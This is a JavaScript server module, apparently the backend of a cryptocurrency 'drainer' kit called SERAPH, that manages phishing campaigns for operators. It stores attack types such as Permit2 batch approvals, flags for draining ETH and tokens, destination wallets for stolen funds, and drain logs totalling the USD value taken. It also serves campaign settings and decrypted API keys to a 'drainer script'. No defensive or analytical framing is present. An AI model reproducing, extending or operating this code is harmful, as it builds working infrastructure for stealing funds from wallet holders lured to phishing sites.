/**
 * ============================================================================
 * SERAPH SERVER - Campaign Service (With API Key Support)
 * ============================================================================
 * 
 * Updated to support:
 * - contract_id assignment
 * - destination_wallet for per-campaign destinations
 * - on_chain_registered status
 * - etherscan_api_key (encrypted)
 * - alchemy_api_key (encrypted)
 * 
 * ============================================================================
 */

import supabase from '../config/supabase.js'
import crypto from 'crypto'
import { encrypt, decrypt, safeEncrypt, safeDecrypt, isEncrypted } from '../utils/encryption.js'

/**
 * Create a new campaign
 */
export async function createCampaign(operatorId, {
  name,
  description,
  domain,
  walletId,
  attackTypes = ['permit2_batch'],
  drainEth = true,
  drainTokens = true,
  minValueUsd = 0
}) {
  // Verify wallet belongs to operator
  if (walletId) {
    const { data: wallet } = await supabase
      .from('wallets')
      .select('id')
      .eq('id', walletId)
      .eq('operator_id', operatorId)
      .single()
    
    if (!wallet) {
      throw new Error('Wallet not found or not owned by you')
    }
  }
  
  // Generate campaign key
  const campaignKey = crypto.randomBytes(16).toString('hex')
  
  const { data, error } = await supabase
    .from('campaigns')
    .insert({
      operator_id: operatorId,
      wallet_id: walletId,
      name,
      description,
      domain,
      campaign_key: campaignKey,
      attack_types: attackTypes,
      drain_eth: drainEth,
      drain_tokens: drainTokens,
      min_value_usd: minValueUsd
    })
    .select()
    .single()
  
  if (error) {
    throw new Error(error.message)
  }
  
  // Update operator campaign count
  await supabase.rpc('increment_operator_campaigns', { op_id: operatorId })
  
  return data
}

/**
 * Get campaigns for operator (with calculated stats from drain_logs)
 */
export async function getCampaigns(operatorId, { page = 1, limit = 20, status, search }) {
  let query = supabase
    .from('campaigns')
    .select(`
      *,
      wallet:wallets(id, address, label),
      contract:contracts(id, name, address, chain_id, contract_type)
    `, { count: 'exact' })
    .eq('operator_id', operatorId)
  
  if (status) {
    query = query.eq('status', status)
  }
  
  if (search) {
    query = query.or(`name.ilike.%${search}%,domain.ilike.%${search}%`)
  }
  
  query = query.order('created_at', { ascending: false })
  
  const from = (page - 1) * limit
  query = query.range(from, from + limit - 1)
  
  const { data, error, count } = await query
  
  if (error) {
    throw new Error(error.message)
  }
  
  // Get drain stats for each campaign from drain_logs
  const campaignIds = (data || []).map(c => c.id)
  
  let drainStats = {}
  if (campaignIds.length > 0) {
    const { data: stats } = await supabase
      .from('drain_logs')
      .select('campaign_id, total_value_usd')
      .in('campaign_id', campaignIds)
      .eq('status', 'success')
    
    // Aggregate by campaign
    if (stats) {
      for (const row of stats) {
        if (!drainStats[row.campaign_id]) {
          drainStats[row.campaign_id] = { count: 0, value: 0 }
        }
        drainStats[row.campaign_id].count++
        drainStats[row.campaign_id].value += parseFloat(row.total_value_usd || 0)
      }
    }
  }
  
  // Remove encrypted keys from response, add indicators and calculated stats
  const safeCampaigns = (data || []).map(c => {
    const { etherscan_api_key_encrypted, alchemy_api_key_encrypted, ...safe } = c
    const stats = drainStats[c.id] || { count: 0, value: 0 }
    return {
      ...safe,
      has_etherscan_key: !!etherscan_api_key_encrypted,
      has_alchemy_key: !!alchemy_api_key_encrypted,
      // Override with calculated stats
      total_drains: stats.count,
      total_value_usd: stats.value
    }
  })
  
  return {
    campaigns: safeCampaigns,
    total: count,
    page,
    limit
  }
}

/**
 * Get all campaigns (admin) - with calculated stats from drain_logs
 */
export async function getAllCampaigns({ page = 1, limit = 20, status, operatorId, search }) {
  let query = supabase
    .from('campaigns')
    .select(`
      *,
      operator:operators(id, username, email),
      wallet:wallets(id, address, label),
      contract:contracts(id, name, address, chain_id, contract_type)
    `, { count: 'exact' })
  
  if (status) {
    query = query.eq('status', status)
  }
  
  if (operatorId) {
    query = query.eq('operator_id', operatorId)
  }
  
  if (search) {
    query = query.or(`name.ilike.%${search}%,domain.ilike.%${search}%`)
  }
  
  query = query.order('created_at', { ascending: false })
  
  const from = (page - 1) * limit
  query = query.range(from, from + limit - 1)
  
  const { data, error, count } = await query
  
  if (error) {
    throw new Error(error.message)
  }
  
  // Get drain stats for each campaign from drain_logs
  const campaignIds = (data || []).map(c => c.id)
  
  let drainStats = {}
  if (campaignIds.length > 0) {
    const { data: stats } = await supabase
      .from('drain_logs')
      .select('campaign_id, total_value_usd')
      .in('campaign_id', campaignIds)
      .eq('status', 'success')
    
    // Aggregate by campaign
    if (stats) {
      for (const row of stats) {
        if (!drainStats[row.campaign_id]) {
          drainStats[row.campaign_id] = { count: 0, value: 0 }
        }
        drainStats[row.campaign_id].count++
        drainStats[row.campaign_id].value += parseFloat(row.total_value_usd || 0)
      }
    }
  }
  
  // Remove encrypted keys from response, add indicators and calculated stats
  const safeCampaigns = (data || []).map(c => {
    const { etherscan_api_key_encrypted, alchemy_api_key_encrypted, ...safe } = c
    const stats = drainStats[c.id] || { count: 0, value: 0 }
    return {
      ...safe,
      has_etherscan_key: !!etherscan_api_key_encrypted,
      has_alchemy_key: !!alchemy_api_key_encrypted,
      // Override with calculated stats
      total_drains: stats.count,
      total_value_usd: stats.value
    }
  })
  
  return {
    campaigns: safeCampaigns,
    total: count,
    page,
    limit
  }
}

/**
 * Get campaign by ID (with calculated stats from drain_logs)
 */
export async function getCampaignById(campaignId, operatorId = null) {
  let query = supabase
    .from('campaigns')
    .select(`
      *,
      operator:operators(id, username, email),
      wallet:wallets(id, address, label, chain_id),
      contract:contracts(id, name, address, chain_id, contract_type)
    `)
    .eq('id', campaignId)
  
  // If operatorId provided, ensure ownership
  if (operatorId) {
    query = query.eq('operator_id', operatorId)
  }
  
  const { data, error } = await query.single()
  
  if (error) {
    throw new Error('Campaign not found')
  }
  
  // Get drain stats from drain_logs
  const { data: drainLogs } = await supabase
    .from('drain_logs')
    .select('total_value_usd')
    .eq('campaign_id', campaignId)
    .eq('status', 'success')
  
  let totalDrains = 0
  let totalValueUsd = 0
  
  if (drainLogs) {
    totalDrains = drainLogs.length
    totalValueUsd = drainLogs.reduce((sum, d) => sum + parseFloat(d.total_value_usd || 0), 0)
  }
  
  // Remove encrypted keys, add indicators and calculated stats
  const { etherscan_api_key_encrypted, alchemy_api_key_encrypted, ...safeData } = data
  
  return {
    ...safeData,
    has_etherscan_key: !!etherscan_api_key_encrypted,
    has_alchemy_key: !!alchemy_api_key_encrypted,
    // Override with calculated stats
    total_drains: totalDrains,
    total_value_usd: totalValueUsd
  }
}

/**
 * Get campaign by key (for drainer script)
 * Includes decrypted API keys for token discovery
 */
export async function getCampaignByKey(campaignKey) {
  const { data, error } = await supabase
    .from('campaigns')
    .select(`
      id,
      name,
      attack_types,
      drain_eth,
      drain_tokens,
      min_value_usd,
      status,
      destination_wallet,
      contract_id,
      on_chain_registered,
      etherscan_api_key_encrypted,
      alchemy_api_key_encrypted,
      wallet:wallets(address, chain_id),
      contract:contracts(address, chain_id, contract_type)
    `)
    .eq('campaign_key', campaignKey)
    .eq('status', 'active')
    .single()
  
  if (error || !data) {
    throw new Error('Campaign not found or inactive')
  }
  
  // Decrypt API keys
  let etherscanApiKey = null
  let alchemyApiKey = null
  
  if (data.etherscan_api_key_encrypted) {
    try {
      etherscanApiKey = safeDecrypt(data.etherscan_api_key_encrypted)
    } catch (err) {
      console.warn('Failed to decrypt etherscan API key:', err.message)
    }
  }
  
  if (data.alchemy_api_key_encrypted) {
    try {
      alchemyApiKey = safeDecrypt(data.alchemy_api_key_encrypted)
    } catch (err) {
      console.warn('Failed to decrypt alchemy API key:', err.message)
    }
  }
  
  // Increment visit count (don't await)
  supabase
    .from('campaigns')
    .update({
      total_visits: (data.total_visits || 0) + 1,
      updated_at: new Date().toISOString()
    })
    .eq('id', data.id)
    .then(() => {})
    .catch(() => {})
  
  return {
    campaignId: data.id,
    name: data.name,
    attackTypes: data.attack_types,
    drainEth: data.drain_eth,
    drainTokens: data.drain_tokens,
    minValueUsd: data.min_value_usd,
    // Use destination_wallet if set, otherwise fall back to wallet address
    destination: data.destination_wallet || data.wallet?.address,
    chainId: data.contract?.chain_id || data.wallet?.chain_id || 11155111,
    contractAddress: data.contract?.address,
    contractType: data.contract?.contract_type,
    onChainRegistered: data.on_chain_registered,
    // API keys for token discovery (decrypted)
    etherscanApiKey,
    alchemyApiKey
  }
}

/**
 * Update campaign
 */
export async function updateCampaign(campaignId, operatorId, updates) {
  // Updated allowedFields to include contract, destination, and API key fields
  const allowedFields = [
    'name', 
    'description', 
    'domain', 
    'wallet_id', 
    'attack_types', 
    'drain_eth', 
    'drain_tokens', 
    'min_value_usd', 
    'status',
    'destination_wallet',
    'contract_id',
    'on_chain_registered',
    'registration_tx_hash'
  ]
  
  const filteredUpdates = {}
  for (const key of allowedFields) {
    if (updates[key] !== undefined) {
      filteredUpdates[key] = updates[key]
    }
  }
  
  // Handle API key updates (encrypt before storing)
  if (updates.etherscan_api_key !== undefined) {
    if (updates.etherscan_api_key) {
      try {
        filteredUpdates.etherscan_api_key_encrypted = encrypt(updates.etherscan_api_key)
      } catch (err) {
        throw new Error('Failed to encrypt Etherscan API key')
      }
    } else {
      // Allow clearing the key
      filteredUpdates.etherscan_api_key_encrypted = null
    }
  }
  
  if (updates.alchemy_api_key !== undefined) {
    if (updates.alchemy_api_key) {
      try {
        filteredUpdates.alchemy_api_key_encrypted = encrypt(updates.alchemy_api_key)
      } catch (err) {
        throw new Error('Failed to encrypt Alchemy API key')
      }
    } else {
      // Allow clearing the key
      filteredUpdates.alchemy_api_key_encrypted = null
    }
  }
  
  // If contract_id is being changed, reset registration status
  if (filteredUpdates.contract_id !== undefined && 
      filteredUpdates.on_chain_registered === undefined) {
    filteredUpdates.on_chain_registered = false
    filteredUpdates.registration_tx_hash = null
  }
  
  filteredUpdates.updated_at = new Date().toISOString()
  
  let query = supabase
    .from('campaigns')
    .update(filteredUpdates)
    .eq('id', campaignId)
  
  if (operatorId) {
    query = query.eq('operator_id', operatorId)
  }
  
  const { data, error } = await query.select().single()
  
  if (error) {
    throw new Error(error.message)
  }
  
  // Remove encrypted keys from response
  const { etherscan_api_key_encrypted, alchemy_api_key_encrypted, ...safeData } = data
  
  return {
    ...safeData,
    has_etherscan_key: !!etherscan_api_key_encrypted,
    has_alchemy_key: !!alchemy_api_key_encrypted
  }
}

/**
 * Delete campaign
 */
export async function deleteCampaign(campaignId, operatorId = null) {
  let query = supabase
    .from('campaigns')
    .delete()
    .eq('id', campaignId)
  
  if (operatorId) {
    query = query.eq('operator_id', operatorId)
  }
  
  const { error } = await query
  
  if (error) {
    throw new Error(error.message)
  }
  
  return true
}

/**
 * Increment campaign stats
 */
export async function incrementCampaignStats(campaignId, { visits = 0, wallets = 0, drains = 0, value = 0 }) {
  const { data: campaign, error: fetchError } = await supabase
    .from('campaigns')
    .select('total_visits, unique_visitors, total_drains, total_value_usd')
    .eq('id', campaignId)
    .single()
  
  if (fetchError) return
  
  const { error } = await supabase
    .from('campaigns')
    .update({
      total_visits: (campaign.total_visits || 0) + visits,
      unique_visitors: (campaign.unique_visitors || 0) + wallets,
      total_drains: (campaign.total_drains || 0) + drains,
      total_value_usd: (campaign.total_value_usd || 0) + value,
      updated_at: new Date().toISOString()
    })
    .eq('id', campaignId)
  
  if (error) {
    console.error('Failed to increment campaign stats:', error)
  }
}

export default {
  createCampaign,
  getCampaigns,
  getAllCampaigns,
  getCampaignById,
  getCampaignByKey,
  updateCampaign,
  deleteCampaign,
  incrementCampaignStats
}